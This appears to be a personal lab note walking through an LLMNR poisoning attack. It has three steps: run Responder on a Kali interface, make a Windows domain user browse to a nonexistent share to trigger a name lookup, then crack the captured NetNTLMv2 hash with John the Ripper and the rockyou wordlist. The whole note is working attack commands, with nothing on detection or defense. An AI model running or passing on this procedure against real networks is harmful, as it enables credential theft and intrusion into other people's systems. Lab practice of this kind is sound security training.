# LLMNR poisoning

# prerequesite: franky.lanie domain user changes logs in on the Win 10 machine using default password -> is prompted to change the password -> changes it to smth simple: Password123

# 1. on Kali linux: 

sudo responder -I eth1

# 2. on Win 10 client logged in as franky.lanie: File Explorer -> search for \\secretFile  (to initiate LLMNR event)

# 3. on Kali: catch the hash -> put into hash2.txt ; download if needed rockyou.txt
#Run

john --format=netntlmv2 --wordlist=rockyou.txt hash2.txt # to start cracking

john --show hash2.txt # to see the cracked password